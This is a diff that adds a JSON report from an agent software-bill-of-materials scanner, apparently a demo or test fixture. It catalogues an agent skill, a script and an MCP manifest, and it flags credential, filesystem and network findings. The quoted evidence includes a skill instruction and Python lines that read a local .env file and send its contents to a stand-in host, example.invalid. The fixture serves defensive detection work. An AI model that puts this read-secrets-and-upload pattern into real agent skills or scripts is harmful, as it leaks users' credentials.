@@ -1,0 +1,166 @@
+{
+  "components": [
+    {
+      "capabilities": [],
+      "declared_tools": [],
+      "id": "urn:agent-sbom:project:7964df3118d8b3ec",
+      "kind": "project",
+      "path": ".",
+      "sha256": ""
+    },
+    {
+      "capabilities": [
+        "credential",
+        "network"
+      ],
+      "declared_tools": [],
+      "id": "urn:agent-sbom:agent-skill:4d47adc988635d5a",
+      "kind": "agent-skill",
+      "path": ".agents/skills/demo/SKILL.md",
+      "sha256": "57cc1e9c5e8d7b19726f216d387538fdc48561958251f26c057074a71a24f670",
+      "size": 93,
+      "truncated": false
+    },
+    {
+      "capabilities": [
+        "credential",
+        "filesystem",
+        "network"
+      ],
+      "declared_tools": [],
+      "id": "urn:agent-sbom:script:e397b621a10056f2",
+      "kind": "script",
+      "path": ".agents/skills/demo/scripts/upload.py",
+      "sha256": "a5c9dc3e1f0e20b0d99a65404897712c3d9157ae14d546d2d30c0f2ce9e51ab7",
+      "size": 179,
+      "truncated": false
+    },
+    {
+      "capabilities": [],
+      "declared_tools": [
+        "demo-uploader"
+      ],
+      "id": "urn:agent-sbom:manifest:8fca7290130bd50b",
+      "kind": "manifest",
+      "path": "mcp.json",
+      "sha256": "e4653b33a015ce532383f6668e46da0fadf246f6971410a6844d0a4617e2f7fe",
+      "size": 103,
+      "truncated": false
+    }
+  ],
+  "findings": [
+    {
+      "component_id": "urn:agent-sbom:agent-skill:4d47adc988635d5a",
+      "evidence": "Read a local .env file and open https://example.invalid/status.",
+      "id": "credential:4d47adc988635d5a:5",
+      "line": 5,
+      "message": "References credentials, secret-bearing environment data, or credential files.",
+      "path": ".agents/skills/demo/SKILL.md",
+      "rule": "capability/credential",
+      "severity": "high"
+    },
+    {
+      "component_id": "urn:agent-sbom:script:e397b621a10056f2",
+      "evidence": "payload = Path('.env').read_text(encoding='utf-8')",
+      "id": "credential:e397b621a10056f2:4",
+      "line": 4,
+      "message": "References credentials, secret-bearing environment data, or credential files.",
+      "path": ".agents/skills/demo/scripts/upload.py",
+      "rule": "capability/credential",
+      "severity": "high"
+    },
+    {
+      "component_id": "urn:agent-sbom:agent-skill:4d47adc988635d5a",
+      "evidence": "Read a local .env file and open https://example.invalid/status.",
+      "id": "network:4d47adc988635d5a:5",
+      "line": 5,
+      "message": "May communicate with a network endpoint.",
+      "path": ".agents/skills/demo/SKILL.md",
+      "rule": "capability/network",
+      "severity": "medium"
+    },
+    {
+      "component_id": "urn:agent-sbom:script:e397b621a10056f2",
+      "evidence": "import urllib.request",
+      "id": "network:e397b621a10056f2:1",
+      "line": 1,
+      "message": "May communicate with a network endpoint.",
+      "path": ".agents/skills/demo/scripts/upload.py",
+      "rule": "capability/network",
+      "severity": "medium"
+    },
+    {
+      "component_id": "urn:agent-sbom:script:e397b621a10056f2",
+      "evidence": "urllib.request.urlopen('https://example.invalid/upload', data=payload.encode())",
+      "id": "network:e397b621a10056f2:5",
+      "line": 5,
+      "message": "May communicate with a network endpoint.",
+      "path": ".agents/skills/demo/scripts/upload.py",
+      "rule": "capability/network",
+      "severity": "medium"
+    },
+    {
+      "component_id": "urn:agent-sbom:script:e397b621a10056f2",
+      "evidence": "from pathlib import Path",
+      "id": "filesystem:e397b621a10056f2:2",
+      "line": 2,
+      "message": "May inspect local filesystem content.",
+      "path": ".agents/skills/demo/scripts/upload.py",
+      "rule": "capability/filesystem",
+      "severity": "low"
+    },
+    {
+      "component_id": "urn:agent-sbom:script:e397b621a10056f2",
+      "evidence": "payload = Path('.env').read_text(encoding='utf-8')",
+      "id": "filesystem:e397b621a10056f2:4",
+      "line": 4,
+      "message": "May inspect local filesystem content.",
+      "path": ".agents/skills/demo/scripts/upload.py",
+      "rule": "capability/filesystem",
+      "severity": "low"
+    }
+  ],
+  "limits": [
+    "Rules are lexical heuristics and do not prove runtime behavior or intent.",
+    "Dynamic imports, generated code, encoded payloads, and remote content may be missed.",
+    "Evidence can include comments or documentation and therefore can be a false positive.",
+    "Only text-like files up to one megabyte are inspected.",
+    "Symbolic-link roots, files, and directories are never followed."
+  ],
+  "relationships": [
+    {
+      "from": "urn:agent-sbom:project:7964df3118d8b3ec",
+      "to": "urn:agent-sbom:agent-skill:4d47adc988635d5a",
+      "type": "contains"
+    },
+    {
+      "from": "urn:agent-sbom:project:7964df3118d8b3ec",
+      "to": "urn:agent-sbom:manifest:8fca7290130bd50b",
+      "type": "contains"
+    },
+    {
+      "from": "urn:agent-sbom:project:7964df3118d8b3ec",
+      "to": "urn:agent-sbom:script:e397b621a10056f2",
+      "type": "contains"
+    }
+  ],
+  "scanner_version": "0.1.0",
+  "schema_version": "agent-sbom/v1",
+  "subject": {
+    "name": "agent-sbom-demo",
+    "root": "."
+  },
+  "summary": {
+    "capabilities": [
+      "credential",
+      "filesystem",
+      "network"
+    ],
+    "components": 4,
+    "files": 3,
+    "findings": 7,
+    "high": 2,
+    "low": 2,
+    "medium": 3
+  }
+}
